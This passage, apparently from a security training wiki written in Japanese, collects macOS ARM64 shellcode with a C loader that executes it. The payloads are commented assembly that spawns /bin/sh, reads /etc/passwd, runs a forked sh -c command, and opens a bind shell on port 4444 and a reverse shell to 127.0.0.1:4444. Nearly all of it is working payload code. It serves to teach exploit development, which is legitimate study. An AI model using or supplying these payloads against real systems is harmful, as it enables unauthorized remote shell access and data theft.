int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

は[**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)から取られ、解説します。

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### catで読み取る

目的は `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` を実行することで、したがって第2引数 (x1) は params の配列で（メモリ上ではこれは addresses の stack を意味する）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### fork から sh でコマンドを実行してメインプロセスが終了しないようにする
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell は [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)（**port 4444**）
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

出典: [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell to **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
